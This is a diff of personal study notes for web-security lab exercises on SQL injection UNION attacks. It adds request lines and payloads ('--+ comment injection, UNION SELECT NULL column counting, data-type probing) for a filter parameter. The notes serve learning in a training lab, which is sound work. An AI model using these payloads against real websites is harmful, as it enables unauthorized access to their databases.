@@ -126,5 +126,18 @@ ANS : GET /filter?category=Gifts'--+
 _________________________________________________________________________________________________________________________________________
 Lab7: SQL injection UNION attack, determining the number of columns returned by the query
 
+      -FIND THE VULNERABLE PARAMETERS
+      GET /filter?category=Pets'--+ HTTP/2
 
-GET /filter?category=Pets'union--+ HTTP/2
+
+
+      -fIND THE NO. OF COLUMNS 
+      'UNION SELECT NULL,NULL,NULL,NULL --+
+
+      -FIND THE DATA TYPE OF COLUMNS
+      'UNION SELECT NULL,'ABC',113 --+
+
+
+
+_________________________________________________________________________________________________________________________________________
+Lab8: SQL injection UNION attack, finding a column containing text
